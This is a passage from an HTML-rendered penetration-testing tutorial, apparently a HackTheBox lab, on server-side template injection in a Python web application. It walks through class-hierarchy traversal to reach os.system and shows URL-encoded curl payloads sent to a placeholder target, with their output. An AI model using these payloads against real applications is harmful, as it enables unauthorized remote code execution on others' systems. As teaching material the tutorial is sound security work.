<a id=__codelineno-7-19 name=__codelineno-7-19></a><span class=p>[</span><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>type</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakref</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakcallableproxy</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>weakproxy</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>int</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytearray</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>bytes</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>list</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>NoneType</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>NotImplementedType</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>traceback</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>super</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>range</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>dict</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_keys</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_values</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_items</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reversekeyiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reversevalueiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>dict_reverseitemiterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>odict_iterator</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>set</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>str</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>slice</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>staticmethod</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>complex</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>float</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>frozenset</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>property</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>managedbuffer</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>memoryview</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>tuple</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>enumerate</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=nb>reversed</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>stderrprinter</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>code</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>frame</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>builtin_function_or_method</span><span class=s1>&#39;&gt;, &lt;class &#39;</span><span class=n>method</span><span class=s1>&#39;&gt;,</span>
<a id=__codelineno-7-20 name=__codelineno-7-20></a> <span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
</code></pre></div> <p>Let us look for useful classes that can facilitate remote code execution.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1></a><span class=o>&gt;&gt;&gt;</span> <span class=n>x</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>mro</span><span class=p>()[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
<a id=__codelineno-8-2 name=__codelineno-8-2></a><span class=o>&gt;&gt;&gt;</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>x</span><span class=p>)):</span><span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=vm>__name__</span><span class=p>)</span>
<a id=__codelineno-8-3 name=__codelineno-8-3></a><span class=o>...</span>
<a id=__codelineno-8-4 name=__codelineno-8-4></a><span class=mi>0</span> <span class=nb>type</span>
<a id=__codelineno-8-5 name=__codelineno-8-5></a><span class=mi>1</span> <span class=n>weakref</span>
<a id=__codelineno-8-6 name=__codelineno-8-6></a><span class=mi>2</span> <span class=n>weakcallableproxy</span>
<a id=__codelineno-8-7 name=__codelineno-8-7></a><span class=mi>3</span> <span class=n>weakproxy</span>
<a id=__codelineno-8-8 name=__codelineno-8-8></a><span class=mi>4</span> <span class=nb>int</span>
<a id=__codelineno-8-9 name=__codelineno-8-9></a><span class=mi>5</span> <span class=nb>bytearray</span>
<a id=__codelineno-8-10 name=__codelineno-8-10></a><span class=mi>6</span> <span class=nb>bytes</span>
<a id=__codelineno-8-11 name=__codelineno-8-11></a><span class=mi>7</span> <span class=nb>list</span>
<a id=__codelineno-8-12 name=__codelineno-8-12></a><span class=mi>8</span> <span class=n>NoneType</span>
<a id=__codelineno-8-13 name=__codelineno-8-13></a><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
<a id=__codelineno-8-14 name=__codelineno-8-14></a>
<a id=__codelineno-8-15 name=__codelineno-8-15></a><span class=o>&gt;&gt;&gt;</span> <span class=k>def</span> <span class=nf>searchfunc</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
<a id=__codelineno-8-16 name=__codelineno-8-16></a><span class=o>...</span>     <span class=n>x</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>mro</span><span class=p>()[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
<a id=__codelineno-8-17 name=__codelineno-8-17></a><span class=o>...</span>     <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>x</span><span class=p>)):</span>
<a id=__codelineno-8-18 name=__codelineno-8-18></a><span class=o>...</span>             <span class=n>fn</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=vm>__name__</span>
<a id=__codelineno-8-19 name=__codelineno-8-19></a><span class=o>...</span>             <span class=k>if</span> <span class=n>fn</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
<a id=__codelineno-8-20 name=__codelineno-8-20></a><span class=o>...</span>                     <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>fn</span><span class=p>)</span>
<a id=__codelineno-8-21 name=__codelineno-8-21></a><span class=o>...</span>
<a id=__codelineno-8-22 name=__codelineno-8-22></a><span class=o>&gt;&gt;&gt;</span> <span class=n>searchfunc</span><span class=p>(</span><span class=s1>&#39;warning&#39;</span><span class=p>)</span>
<a id=__codelineno-8-23 name=__codelineno-8-23></a>
<a id=__codelineno-8-24 name=__codelineno-8-24></a><span class=mi>215</span> <span class=n>catch_warnings</span>
</code></pre></div> <p>Why are we searching for <code>warning</code> you may ask. We chose this class because it imports Python's <a href=https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3>sys module</a> , and from <code>sys</code>, the <code>os</code> module can be reached. More precisely, os modules are all from <code>warnings.catch_</code>.</p> <p>We have seen that <code>catch_warnings</code> is present without importing any additional module to our Python console. Let's enumerate the builtins from this class:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1></a><span class=o>&gt;&gt;&gt;</span> <span class=n>y</span> <span class=o>=</span> <span class=n>x</span><span class=p>[</span><span class=mi>215</span><span class=p>]</span>
<a id=__codelineno-9-2 name=__codelineno-9-2></a><span class=o>&gt;&gt;&gt;</span> <span class=n>y</span>
<a id=__codelineno-9-3 name=__codelineno-9-3></a>
<a id=__codelineno-9-4 name=__codelineno-9-4></a><span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>warnings</span><span class=o>.</span><span class=n>catch_warnings</span><span class=s1>&#39;&gt;</span>
<a id=__codelineno-9-5 name=__codelineno-9-5></a>
<a id=__codelineno-9-6 name=__codelineno-9-6></a>
<a id=__codelineno-9-7 name=__codelineno-9-7></a><span class=o>&gt;&gt;&gt;</span> <span class=n>y</span><span class=p>()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span>
<a id=__codelineno-9-8 name=__codelineno-9-8></a>
<a id=__codelineno-9-9 name=__codelineno-9-9></a><span class=p>{</span><span class=s1>&#39;__name__&#39;</span><span class=p>:</span> <span class=s1>&#39;builtins&#39;</span><span class=p>,</span> <span class=s1>&#39;__doc__&#39;</span><span class=p>:</span> <span class=s2>&quot;Built-in functions, exceptions, and other objects.</span><span class=se>\n\n</span><span class=s2>Noteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&quot;</span><span class=p>,</span> <span class=s1>&#39;__package__&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;__loader__&#39;</span><span class=p>:</span> <span class=o>&lt;</span><span class=k>class</span> <span class=err>&#39;</span><span class=nc>_frozen_importlib</span><span class=o>.</span><span class=n>BuiltinImporter</span><span class=s1>&#39;&gt;, &#39;</span><span class=n>__spec__</span><span class=s1>&#39;: ModuleSpec(name=&#39;</span><span class=n>builtins</span><span class=s1>&#39;, loader=&lt;class &#39;</span><span class=n>_frozen_importlib</span><span class=o>.</span><span class=n>BuiltinImporter</span><span class=s1>&#39;&gt;), &#39;</span><span class=n>__build_class__</span><span class=s1>&#39;: &lt;built-in function __build_class__&gt;, &#39;</span><span class=nb>__import__</span><span class=s1>&#39;: &lt;built-in function __import__&gt;, &#39;</span><span class=nb>abs</span><span class=s1>&#39;: &lt;built-in function abs&gt;, &#39;</span><span class=nb>all</span><span class=s1>&#39;: &lt;built-in function all&gt;, &#39;</span><span class=nb>any</span><span class=s1>&#39;: &lt;built-in function any&gt;, &#39;</span><span class=n>ascii</span><span class=s1>&#39;: &lt;built-in function ascii&gt;, &#39;</span><span class=nb>bin</span><span class=s1>&#39;: &lt;built-in function bin&gt;, &#39;</span><span class=n>breakpoint</span><span class=s1>&#39;: &lt;built-in function breakpoint&gt;, &#39;</span><span class=n>callable</span><span class=s1>&#39;: &lt;built-in function callable&gt;, &#39;</span><span class=nb>chr</span><span class=s1>&#39;: &lt;built-in function chr&gt;, &#39;</span><span class=nb>compile</span><span class=s1>&#39;: &lt;built-in function compile&gt;, &#39;</span><span class=nb>delattr</span><span class=s1>&#39;: &lt;built-in function delattr&gt;, &#39;</span><span class=nb>dir</span><span class=s1>&#39;: &lt;built-in function dir&gt;, &#39;</span><span class=nb>divmod</span><span class=s1>&#39;: &lt;built-in function divmod&gt;, &#39;</span><span class=nb>eval</span><span class=s1>&#39;: &lt;built-in function eval&gt;, &#39;</span><span class=n>exec</span><span class=s1>&#39;: &lt;built-in function exec&gt;, &#39;</span><span class=nb>format</span><span class=s1>&#39;: &lt;built-in function format&gt;, &#39;</span><span class=nb>getattr</span><span class=s1>&#39;: &lt;built-in function getattr&gt;, &#39;</span><span class=nb>globals</span><span class=s1>&#39;: &lt;built-in function globals&gt;,</span>
<a id=__codelineno-9-10 name=__codelineno-9-10></a> <span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
<a id=__codelineno-9-11 name=__codelineno-9-11></a>
<a id=__codelineno-9-12 name=__codelineno-9-12></a>
<a id=__codelineno-9-13 name=__codelineno-9-13></a><span class=o>&gt;&gt;&gt;</span> <span class=n>z</span> <span class=o>=</span> <span class=n>y</span><span class=p>()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span>
<a id=__codelineno-9-14 name=__codelineno-9-14></a><span class=o>&gt;&gt;&gt;</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>z</span><span class=p>:</span>
<a id=__codelineno-9-15 name=__codelineno-9-15></a><span class=o>...</span>     <span class=k>if</span> <span class=n>i</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;import&#39;</span><span class=p>)</span> <span class=o>&gt;-</span><span class=mi>1</span><span class=p>:</span>
<a id=__codelineno-9-16 name=__codelineno-9-16></a><span class=o>...</span>             <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>z</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
<a id=__codelineno-9-17 name=__codelineno-9-17></a><span class=o>...</span> 
<a id=__codelineno-9-18 name=__codelineno-9-18></a><span class=nb>__import__</span> <span class=o>&lt;</span><span class=n>built</span><span class=o>-</span><span class=ow>in</span> <span class=n>function</span> <span class=nb>__import__</span><span class=o>&gt;</span>
</code></pre></div> <p>It seems we have reached the import function by walking the hierarchy. This means we can load os and use the system function to execute code all coming from a string object:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1></a><span class=o>&gt;&gt;&gt;</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span>
<a id=__codelineno-10-2 name=__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3></a><span class=p>[</span><span class=mi>215</span><span class=p>]()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span><span class=p>[</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s1>&#39;echo RCE from a string object&#39;</span><span class=p>)</span>
<a id=__codelineno-10-4 name=__codelineno-10-4></a><span class=n>RCE</span> <span class=kn>from</span> <span class=nn>a</span> <span class=n>string</span> <span class=nb>object</span>
<a id=__codelineno-10-5 name=__codelineno-10-5></a><span class=mi>0</span>
</code></pre></div> <p>Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.</p> <p>Payload: <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1></a><span class=p>{{</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span> <span class=p>}}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D&quot;</span>
<a id=__codelineno-12-2 name=__codelineno-12-2></a>
<a id=__codelineno-12-3 name=__codelineno-12-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-12-4 name=__codelineno-12-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-12-5 name=__codelineno-12-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-12-6 name=__codelineno-12-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-12-7 name=__codelineno-12-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-12-8 name=__codelineno-12-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-12-9 name=__codelineno-12-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-12-10 name=__codelineno-12-10></a><span class=go>                &lt;a&gt;&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;&lt;/a&gt;</span>
<a id=__codelineno-12-11 name=__codelineno-12-11></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-12-12 name=__codelineno-12-12></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-12-13 name=__codelineno-12-13></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-12-14 name=__codelineno-12-14></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-12-15 name=__codelineno-12-15></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-12-16 name=__codelineno-12-16></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>Payload: <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1></a><span class=p>{{</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span> <span class=p>}}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D&quot;</span>
<a id=__codelineno-14-2 name=__codelineno-14-2></a>
<a id=__codelineno-14-3 name=__codelineno-14-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-14-4 name=__codelineno-14-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-14-5 name=__codelineno-14-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-14-6 name=__codelineno-14-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-14-7 name=__codelineno-14-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-14-8 name=__codelineno-14-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-14-9 name=__codelineno-14-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-14-10 name=__codelineno-14-10></a><span class=go>                &lt;a&gt;(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)&lt;/a&gt;</span>
<a id=__codelineno-14-11 name=__codelineno-14-11></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-14-12 name=__codelineno-14-12></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-14-13 name=__codelineno-14-13></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-14-14 name=__codelineno-14-14></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-14-15 name=__codelineno-14-15></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-14-16 name=__codelineno-14-16></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>We are interested in the second item, so the payload should become: <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1></a><span class=p>{{</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>}}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D&quot;</span>
<a id=__codelineno-16-2 name=__codelineno-16-2></a>
<a id=__codelineno-16-3 name=__codelineno-16-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-16-4 name=__codelineno-16-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-16-5 name=__codelineno-16-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-16-6 name=__codelineno-16-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-16-7 name=__codelineno-16-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-16-8 name=__codelineno-16-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-16-9 name=__codelineno-16-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-16-10 name=__codelineno-16-10></a><span class=go>                &lt;a&gt;&amp;lt;class &amp;#39;object&amp;#39;&amp;gt;&lt;/a&gt;</span>
<a id=__codelineno-16-11 name=__codelineno-16-11></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-16-12 name=__codelineno-16-12></a><span class=go>                &lt;input type=&quot;submit&quot; value=&quot;execute&quot;&gt;</span>
<a id=__codelineno-16-13 name=__codelineno-16-13></a><span class=go>            &lt;/form&gt;</span>
<a id=__codelineno-16-14 name=__codelineno-16-14></a><span class=go>        &lt;/div&gt;</span>
<a id=__codelineno-16-15 name=__codelineno-16-15></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-16-16 name=__codelineno-16-16></a><span class=go>&lt;/body&gt;</span>
</code></pre></div> <p>Start by walking down the hierarchy <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1></a><span class=p>{{</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__mro__</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>}}</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -gs <span class=s2>&quot;http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D&quot;</span>
<a id=__codelineno-18-2 name=__codelineno-18-2></a>
<a id=__codelineno-18-3 name=__codelineno-18-3></a><span class=go>&lt;SNIP&gt;</span>
<a id=__codelineno-18-4 name=__codelineno-18-4></a><span class=go>&lt;body&gt;</span>
<a id=__codelineno-18-5 name=__codelineno-18-5></a><span class=go>    &lt;div id=&quot;desktop&quot;&gt;</span>
<a id=__codelineno-18-6 name=__codelineno-18-6></a><span class=go>        &lt;div class=&quot;window&quot; data-title=&quot;Run&quot;&gt;</span>
<a id=__codelineno-18-7 name=__codelineno-18-7></a><span class=go>            &lt;form action=&quot;/execute&quot; method=&quot;get&quot;&gt;</span>
<a id=__codelineno-18-8 name=__codelineno-18-8></a><span class=go>                &lt;a&gt;C:\&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; id=&quot;command&quot;&gt;&lt;/a&gt;</span>
<a id=__codelineno-18-9 name=__codelineno-18-9></a><span class=go>                &lt;br/&gt;</span>
<a id=__codelineno-18-10 name=__codelineno-18-10></a><span class=go>                &lt;a&gt;[&amp;lt;class &amp;#39;type&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakcallableproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;int&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NoneType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NotImplementedType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;super&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversekeyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversevalueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reverseitemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;odict_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;slice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;staticmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;complex&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;float&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frozenset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;managedbuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;memoryview&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enumerate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reversed&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;stderrprinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;code&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;builtin_function_or_method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;function&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mappingproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;getset_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;wrapper_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method-wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ellipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;member_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.SimpleNamespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;PyCapsule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;longrange_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;cell&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;instancemethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;callable_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle.PickleBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;InterpreterID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;EncodingMap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;fieldnameiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;formatteriterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;BaseException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_array_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_bitmap_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_collision_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ContextVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Token.MISSING&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;moduledef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;module&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zip&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._DummyModuleLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ModuleLockManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.ModuleSpec&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.BuiltinImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib.FrozenImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_frozen_importlib._ImportLockContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_thread._localdummy&amp;#39;&amp;gt;, &amp;lt;class 